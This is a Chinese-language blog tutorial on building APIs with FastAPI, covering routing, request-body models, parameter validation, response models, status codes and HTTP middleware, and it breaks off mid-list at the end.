<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_root</span>():</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;Hello&quot;</span>: <span class="string">&quot;World&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/items/&#123;item_id&#125;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_item</span>(<span class="params">item_id: <span class="built_in">int</span>, q: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;item_id&quot;</span>: item_id, <span class="string">&quot;q&quot;</span>: q&#125;</span><br></pre></td></tr></table></figure>

<p><strong>关于函数是否使用<code>async</code>?</strong></p>
<blockquote>
<p>文档参考 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9mYXN0YXBpLnRpYW5nb2xvLmNvbS9hc3luYy8jaW4tYS1odXJyeQ==">🚪</span></p>
</blockquote>
<p>如果不清楚函数内调用是否异步, 那就定义为普通函数, <code>Fastapi</code>会放到<code>thread pool</code>里执行; 如果有使用异步并且是在高并发情景下, 使用<code>async</code>速度会更快.</p>
<h2 id="运行启动"><a href="#运行启动" class="headerlink" title="运行启动"></a>运行启动</h2><h3 id="命令行启动"><a href="#命令行启动" class="headerlink" title="命令行启动"></a>命令行启动</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">uvicorn main:app --reload</span><br></pre></td></tr></table></figure>

<ul>
<li><code>main</code>: <code>main.py</code> 文件（一个 Python &quot;模块&quot;）。</li>
<li><code>app</code>: 在 <code>main.py</code> 文件中通过 <code>app = FastAPI()</code> 创建的对象。</li>
<li><code>--reload</code>: 让服务器在更新代码后重新启动。仅在开发时使用该选项。</li>
<li><code>--host</code>: 设置映射IP, 默认127.0.0.1</li>
<li><code>--port</code>: 设置映射端口, 默认8000</li>
</ul>
<p>访问 <span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDAwL2l0ZW1zLzU/cT1zb21lcXVlcnk=">http://127.0.0.1:8000/items/5?q=somequery</span> 会返回 <code>&#123;&quot;item_id&quot;: 5, &quot;q&quot;: &quot;somequery&quot;&#125;</code></p>
<h3 id="程序内启动"><a href="#程序内启动" class="headerlink" title="程序内启动"></a>程序内启动</h3><p>可以用于调试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> uvicorn</span><br><span class="line"></span><br><span class="line"><span class="comment"># body...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    uvicorn.run(app, host=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure>



<h2 id="自带文档"><a href="#自带文档" class="headerlink" title="自带文档"></a>自带文档</h2><ul>
<li>访问 <span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDAwL2RvY3M=">http://127.0.0.1:8000/docs</span> 是由<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3N3YWdnZXItYXBpL3N3YWdnZXItdWk=">Swagger UI</span>自动生成的交互式文档</li>
<li>访问 <span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDAwL3JlZG9j">http://127.0.0.1:8000/redoc</span> 是由<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1JlYmlsbHkvUmVEb2M=">ReDoc</span> 生成自动生成的交互式文档</li>
</ul>
<h2 id="设置枚举类型"><a href="#设置枚举类型" class="headerlink" title="设置枚举类型"></a>设置枚举类型</h2><p>导入<code>Enum</code></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> <span class="keyword">enum</span> <span class="keyword">import</span> Enum</span><br></pre></td></tr></table></figure>

<p>继承并声明枚举类</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="symbol">ModelName</span>(<span class="symbol">str, <span class="symbol">Enum</span></span>):</span><br><span class="line">    <span class="symbol">alexnet</span> = &quot;<span class="symbol">alexnet</span>&quot;</span><br><span class="line">    <span class="symbol">resnet</span> = &quot;<span class="symbol">resnet</span>&quot;</span><br><span class="line">    <span class="symbol">lenet</span> = &quot;<span class="symbol">lenet</span>&quot;</span><br></pre></td></tr></table></figure>

<p>将其声明为参数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/models/&#123;model_name&#125;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">get_model</span>(<span class="params">model_name: ModelName</span>):</span><br><span class="line">    <span class="keyword">if</span> model_name == ModelName.alexnet:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;model_name&quot;</span>: model_name, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Deep Learning FTW!&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> model_name.value == <span class="string">&quot;lenet&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;model_name&quot;</span>: model_name, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;LeCNN all the images&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;model_name&quot;</span>: model_name, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Have some residuals&quot;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="设置请求体"><a href="#设置请求体" class="headerlink" title="设置请求体"></a>设置请求体</h2><h3 id="基础应用"><a href="#基础应用" class="headerlink" title="基础应用"></a>基础应用</h3><p>导入<code>BaseModel</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pydantic <span class="keyword">import</span> BaseModel</span><br></pre></td></tr></table></figure>

<p>继承并声明数据模型类</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Item</span>(<span class="title class_ inherited__">BaseModel</span>):</span><br><span class="line">    name: <span class="built_in">str</span></span><br><span class="line">    description: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span></span><br><span class="line">    price: <span class="built_in">float</span></span><br><span class="line">    tax: <span class="type">Optional</span>[<span class="built_in">float</span>] = <span class="literal">None</span></span><br></pre></td></tr></table></figure>

<p>将其声明为参数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/items/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_item</span>(<span class="params">item: Item</span>):</span><br><span class="line">    <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure>

<p>请求格式应为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Foo&quot;</span>,</span><br><span class="line">  <span class="string">&quot;description&quot;</span>: <span class="string">&quot;An optional description&quot;</span>,</span><br><span class="line">  <span class="string">&quot;price&quot;</span>: <span class="number">45.2</span>,</span><br><span class="line">  <span class="string">&quot;tax&quot;</span>: <span class="number">3.5</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="多个请求体参数"><a href="#多个请求体参数" class="headerlink" title="多个请求体参数"></a>多个请求体参数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(<span class="title class_ inherited__">BaseModel</span>):</span><br><span class="line">    username: <span class="built_in">str</span></span><br><span class="line">    full_name: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.put(<span class="params"><span class="string">&quot;/items/&#123;item_id&#125;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">update_item</span>(<span class="params">item_id: <span class="built_in">int</span>, item: Item, user: User</span>):</span><br><span class="line">    results = &#123;<span class="string">&quot;item_id&quot;</span>: item_id, <span class="string">&quot;item&quot;</span>: item, <span class="string">&quot;user&quot;</span>: user&#125;</span><br><span class="line">    <span class="keyword">return</span> results</span><br></pre></td></tr></table></figure>

<p>请求格式应为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;item&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Foo&quot;</span>,</span><br><span class="line">        <span class="string">&quot;description&quot;</span>: <span class="string">&quot;The pretender&quot;</span>,</span><br><span class="line">        <span class="string">&quot;price&quot;</span>: <span class="number">42.0</span>,</span><br><span class="line">        <span class="string">&quot;tax&quot;</span>: <span class="number">3.2</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;user&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;dave&quot;</span>,</span><br><span class="line">        <span class="string">&quot;full_name&quot;</span>: <span class="string">&quot;Dave Grohl&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="单个请求体参数"><a href="#单个请求体参数" class="headerlink" title="单个请求体参数"></a>单个请求体参数</h3><p>导入<code>Body</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> Body</span><br></pre></td></tr></table></figure>

<p>使用<code>Body()</code>设置</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/items/&#123;item_id&#125;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">update_item</span>(<span class="params">item_id: <span class="built_in">int</span>, item: Item = Body(<span class="params">..., embed=<span class="literal">True</span></span>)</span>):</span><br><span class="line">    results = &#123;<span class="string">&quot;item_id&quot;</span>: item_id, <span class="string">&quot;item&quot;</span>: item&#125;</span><br><span class="line">    <span class="keyword">return</span> results</span><br></pre></td></tr></table></figure>

<p>请求格式应为</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;item&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Foo&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;The pretender&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;price&quot;</span><span class="punctuation">:</span> <span class="number">42.0</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;tax&quot;</span><span class="punctuation">:</span> <span class="number">3.2</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="嵌套格式请求体"><a href="#嵌套格式请求体" class="headerlink" title="嵌套格式请求体"></a>嵌套格式请求体</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Image</span>(<span class="title class_ inherited__">BaseModel</span>):</span><br><span class="line">    url: HttpUrl</span><br><span class="line">    name: <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Item</span>(<span class="title class_ inherited__">BaseModel</span>):</span><br><span class="line">    image: <span class="type">Optional</span>[Image] = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.put(<span class="params"><span class="string">&quot;/items/&#123;item_id&#125;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">update_item</span>(<span class="params">item_id: <span class="built_in">int</span>, item: Item</span>):</span><br><span class="line">    results = &#123;<span class="string">&quot;item_id&quot;</span>: item_id, <span class="string">&quot;item&quot;</span>: item&#125;</span><br><span class="line">    <span class="keyword">return</span> results</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>请求格式应为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;images&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://example.com/baz.jpg&quot;</span>,</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;The Foo live&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://example.com/dave.jpg&quot;</span>,</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;The Baz&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="为参数添加校验"><a href="#为参数添加校验" class="headerlink" title="为参数添加校验"></a>为参数添加校验</h2><h3 id="查询参数校验"><a href="#查询参数校验" class="headerlink" title="查询参数校验"></a>查询参数校验</h3><p>导入<code>Query</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> Query</span><br></pre></td></tr></table></figure>

<p>将 <code>Query</code> 用作查询参数的默认值，并设置<code>min_length</code>为3,<code>max_length</code>为9</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/items/&quot;</span></span>)</span></span><br><span class="line"><span class="comment"># Query 的第一个参数用于定义默认值</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">read_items</span>(<span class="params">q: <span class="type">Optional</span>[<span class="built_in">str</span>] = Query(<span class="params"><span class="literal">None</span>, min_length=<span class="number">3</span>, max_length=<span class="number">9</span></span>)</span>):</span><br><span class="line">    results = &#123;<span class="string">&quot;items&quot;</span>: [&#123;<span class="string">&quot;item_id&quot;</span>: <span class="string">&quot;Foo&quot;</span>&#125;, &#123;<span class="string">&quot;item_id&quot;</span>: <span class="string">&quot;Bar&quot;</span>&#125;]&#125;</span><br><span class="line">    <span class="keyword">if</span> q:</span><br><span class="line">        results.update(&#123;<span class="string">&quot;q&quot;</span>: q&#125;)</span><br><span class="line">    <span class="keyword">return</span> results</span><br></pre></td></tr></table></figure>

<p>其它校验参数(对应类型为int或float)</p>
<ul>
<li><code>gt</code>：大于（<code>g</code>reater <code>t</code>han）</li>
<li><code>ge</code>：大于等于（<code>g</code>reater than or <code>e</code>qual）</li>
<li><code>lt</code>：小于（<code>l</code>ess <code>t</code>han）</li>
<li><code>le</code>：小于等于（<code>l</code>ess than or <code>e</code>qual）</li>
</ul>
<p>也可以用正则表达式进行判断<code>regex</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Query(<span class="literal">None</span>, regex=<span class="string">r&quot;.&#123;3,9&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>测试一下</p>
<ul>
<li><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDAwL2l0ZW1zLz9xPTEy">http://127.0.0.1:8000/items/?q=12</span></li>
<li><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDAwL2l0ZW1zLz9xPTEyMzQ1Ng==">http://127.0.0.1:8000/items/?q=123456</span></li>
<li><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDAwL2l0ZW1zLz9xPTEyMzQ1Njc4OTA=">http://127.0.0.1:8000/items/?q=1234567890</span></li>
</ul>
<h3 id="使用参数别名"><a href="#使用参数别名" class="headerlink" title="使用参数别名"></a>使用参数别名</h3><p>在Query中使用<code>alias</code>, 设置<code>q</code>别名为<code>item-query</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&#x27;/items/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">read_items</span>(<span class="params">q: <span class="type">Optional</span>[<span class="built_in">str</span>] = Query(<span class="params"><span class="literal">None</span>, alias=<span class="string">&quot;item-query&quot;</span></span>)</span>):</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;q&#x27;</span>: q&#125;</span><br></pre></td></tr></table></figure>

<p>测试一下</p>
<ul>
<li><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDAwL2l0ZW1zP3E9aGVsbG8=">http://127.0.0.1:8000/items?q=hello</span></li>
<li><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDAwL2l0ZW1zP2l0ZW0tcXVlcnk9aGVsbG8=">http://127.0.0.1:8000/items?item-query=hello</span></li>
</ul>
<h3 id="路径参数校验"><a href="#路径参数校验" class="headerlink" title="路径参数校验"></a>路径参数校验</h3><p>导入<code>Path</code></p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> <span class="type">Path</span></span><br></pre></td></tr></table></figure>

<p>使用方法和<code>Query</code>一样, 第一个参数为默认参数, 使用<code>...</code>表示该参数为必需参数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/items/&#123;item_id&#125;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">read_items</span>(<span class="params"></span></span><br><span class="line"><span class="params">    *,</span></span><br><span class="line"><span class="params">    item_id: <span class="built_in">int</span> = Path(<span class="params">..., title=<span class="string">&quot;The ID of the item to get&quot;</span>, ge=<span class="number">0</span>, le=<span class="number">1000</span></span>),</span></span><br><span class="line"><span class="params">    size: <span class="built_in">float</span> = Query(<span class="params">..., gt=<span class="number">0</span>, lt=<span class="number">10.5</span></span>)</span></span><br><span class="line"><span class="params"></span>):</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;item_id&quot;</span>: item_id&#125;</span><br></pre></td></tr></table></figure>

<p>测试一下</p>
<ul>
<li><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDAwL2l0ZW1zLzEwMDA/c2l6ZT0xLjI=">http://127.0.0.1:8000/items/1000?size=1.2</span></li>
<li><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDAwL2l0ZW1zLzEwMA==">http://127.0.0.1:8000/items/100</span></li>
</ul>
<h3 id="请求体字段校验"><a href="#请求体字段校验" class="headerlink" title="请求体字段校验"></a>请求体字段校验</h3><blockquote>
<p>官方参考 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9mYXN0YXBpLnRpYW5nb2xvLmNvbS96aC90dXRvcmlhbC9ib2R5LWZpZWxkcy8=">🚪</span></p>
</blockquote>
<p><em><strong>注: Body、Query、Path的大部分参数是一样的</strong></em></p>
<h2 id="获取Header和Cookie"><a href="#获取Header和Cookie" class="headerlink" title="获取Header和Cookie"></a>获取Header和Cookie</h2><p>导入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> Header, Cookie</span><br></pre></td></tr></table></figure>

<p>声明</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/items/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_items</span>(<span class="params">user_agent: <span class="type">Optional</span>[<span class="built_in">str</span>] = Header(<span class="params"><span class="literal">None</span></span>), ads_id: <span class="type">Optional</span>[<span class="built_in">str</span>] = Cookie(<span class="params"><span class="literal">None</span></span>):</span></span><br><span class="line"><span class="params">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="params">        <span class="string">&quot;User-Agent&quot;</span>: user_agent,</span></span><br><span class="line"><span class="params">    	<span class="string">&quot;ads_id&quot;</span>: ads_id</span></span><br><span class="line"><span class="params">    &#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="响应和输出"><a href="#响应和输出" class="headerlink" title="响应和输出"></a>响应和输出</h2><h3 id="设置输出模型"><a href="#设置输出模型" class="headerlink" title="设置输出模型"></a>设置输出模型</h3><p><code>@app</code>设置<code>response_model</code>参数, </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI</span><br><span class="line"><span class="keyword">from</span> pydantic <span class="keyword">import</span> BaseModel, EmailStr</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserIn</span>(<span class="title class_ inherited__">BaseModel</span>):</span><br><span class="line">    username: <span class="built_in">str</span></span><br><span class="line">    password: <span class="built_in">str</span></span><br><span class="line">    email: EmailStr</span><br><span class="line">    full_name: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出模型不包含密码</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserOut</span>(<span class="title class_ inherited__">BaseModel</span>):</span><br><span class="line">    username: <span class="built_in">str</span></span><br><span class="line">    email: EmailStr</span><br><span class="line">    full_name: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置对应输出模型</span></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/user/&quot;</span>, response_model=UserOut</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">create_user</span>(<span class="params">user: UserIn</span>):</span><br><span class="line">    <span class="keyword">return</span> user</span><br></pre></td></tr></table></figure>

<h3 id="设置响应不包含默认值"><a href="#设置响应不包含默认值" class="headerlink" title="设置响应不包含默认值"></a>设置响应不包含默认值</h3><p><code>@app</code>设置<code>response_model_exclude_unset</code>参数为<code>True</code>, 不想获取过多Json可以用的上.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span>, <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI</span><br><span class="line"><span class="keyword">from</span> pydantic <span class="keyword">import</span> BaseModel</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Item</span>(<span class="title class_ inherited__">BaseModel</span>):</span><br><span class="line">    name: <span class="built_in">str</span></span><br><span class="line">    description: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span></span><br><span class="line">    price: <span class="built_in">float</span></span><br><span class="line">    tax: <span class="built_in">float</span> = <span class="number">10.5</span></span><br><span class="line">    tags: <span class="type">List</span>[<span class="built_in">str</span>] = []</span><br><span class="line"></span><br><span class="line">items = &#123;</span><br><span class="line">    <span class="string">&quot;foo&quot;</span>: &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Foo&quot;</span>, <span class="string">&quot;price&quot;</span>: <span class="number">50.2</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/items/&#123;item_id&#125;&quot;</span>, response_model=Item, response_model_exclude_unset=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">read_item</span>(<span class="params">item_id: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">return</span> items[item_id]</span><br></pre></td></tr></table></figure>

<p>响应为</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Foo&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;price&quot;</span><span class="punctuation">:</span> <span class="number">50.2</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>而不是</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Foo&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="keyword">null</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;price&quot;</span><span class="punctuation">:</span> <span class="number">50.2</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;tax&quot;</span><span class="punctuation">:</span> <span class="number">10.5</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;tags&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="设置响应状态码"><a href="#设置响应状态码" class="headerlink" title="设置响应状态码"></a>设置响应状态码</h2><p><code>@app</code>设置参数<code>status_code</code>, 响应时会返回对应状态码, 不想暴露真实状态码时会很有用.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI, status</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用status自带的变量映射,或者直接使用数字</span></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/items/&quot;</span>, status_code=status.HTTP_201_CREATED</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">create_item</span>(<span class="params">name: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;name&quot;</span>: name&#125;</span><br></pre></td></tr></table></figure>





<hr>
<blockquote>
<p>PS: 到这里, 简单的API应用就没问题了, 接下来是一些进阶技巧</p>
</blockquote>
<h2 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h2><blockquote>
<p>&quot;中间件&quot;是一个函数,它在每个<strong>请求</strong>被特定的<em>路径操作</em>处理之前,以及在每个<strong>响应</strong>返回之前工作.</p>
</blockquote>
<p>使用装饰器 <code>@app.middleware(&quot;http&quot;)</code>来添加中间件</p>
<ul>
<li>第一个参数: request</li>
<li>第二个参数: 一个函数 <code>call_next</code> (函数名可自定义)<ul>
<li>它将接收 <code>request</code> 作为参数</li>
<li>将 <code>request</code> 传递给相应的 路径操作</li>
<li>然后它将返回由相应的 路径操作 生成的 <code>response</code>.</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI, Request</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">num: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;num&quot;</span>: num&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.middleware(<span class="params"><span class="string">&quot;http&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">add_process_time_header</span>(<span class="params">request: Request, call_next</span>):</span><br><span class="line"></span><br><span class="line">    start_time = time.time()</span><br><span class="line">    response = <span class="keyword">await</span> call_next(request)</span><br><span class="line">    process_time = time.time() - start_time</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 添加回调时间</span></span><br><span class="line">    response.headers[<span class="string">&quot;X-Process-Time&quot;</span>] = <span class="built_in">str</span>(process_time)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.middleware(<span class="params"><span class="string">&quot;http&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">set_status_code_eq_200</span>(<span class="params">request: Request, call_next</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;set code eq 200&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    response = <span class="keyword">await</span> call_next(request)</span><br><span class="line">    </span><br><span class="line">	<span class="comment"># 修改所有响应状态码一直为200</span></span><br><span class="line">    response.status_code = <span class="number">200</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    uvicorn.run(app, host=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure>

<p>使用调试模式测试一下, 顺便观察下中间件的执行顺序</p>
<ul>
